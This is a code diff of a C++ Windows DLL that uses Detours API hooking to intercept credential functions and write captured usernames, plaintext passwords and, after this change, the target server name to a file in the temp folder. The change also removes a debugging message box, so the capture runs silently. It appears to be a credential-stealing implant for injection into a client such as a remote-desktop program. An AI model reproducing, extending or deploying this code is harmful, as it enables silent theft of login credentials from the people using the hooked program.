@@ -1,16 +1,21 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
+
+
 #include "stdafx.h"
 #include <Windows.h>
 #include <detours.h>
 #include <dpapi.h>
 #include <wincred.h>
 #include <strsafe.h>
+#include <subauth.h>
+#define SECURITY_WIN32 
+#include <sspi.h>
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "Advapi32.lib")
-
+#pragma comment(lib, "Secur32.lib")
 LPCWSTR lpTempPassword = NULL;
 LPCWSTR lpUsername = NULL;
-
+LPCWSTR lpServer = NULL;
 VOID WriteCredentials() {
 	const DWORD cbBuffer = 1024;
 	TCHAR TempFolder[MAX_PATH];
@@ -21,12 +26,20 @@ VOID WriteCredentials() {
 	WCHAR  DataBuffer[cbBuffer];
 	memset(DataBuffer, 0x00, cbBuffer);
 	DWORD dwBytesWritten = 0;
-	StringCbPrintf(DataBuffer, cbBuffer, L"Username: %s\nPassword: %s\n\n", lpUsername, lpTempPassword);
+	StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s\nUsername: %s\nPassword: %s\n\n",lpServer, lpUsername, lpTempPassword);
 
-	MessageBox(NULL, DataBuffer, L"Creds", 0);
 	WriteFile(hFile, DataBuffer, wcslen(DataBuffer)*2, &dwBytesWritten, NULL);
 	CloseHandle(hFile);
 	
+}
+
+
+static SECURITY_STATUS(WINAPI * OriginalSspiPrepareForCredRead)(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) = SspiPrepareForCredRead;
+
+SECURITY_STATUS _SspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR *ppszCredmanTargetName) {
+
+	lpServer = pszTargetName;
+	return OriginalSspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
 }
 
 
@@ -79,16 +92,17 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
 		DetourTransactionBegin();
 		DetourUpdateThread(GetCurrentThread());
 		DetourAttach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
-
 		DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
+		DetourAttach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
+
 		DetourTransactionCommit();
 	}
 	else if (dwReason == DLL_PROCESS_DETACH) {
 		DetourTransactionBegin();
 		DetourUpdateThread(GetCurrentThread());
 		DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
-
 		DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
+		DetourDetach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
 		DetourTransactionCommit();
 
 	}
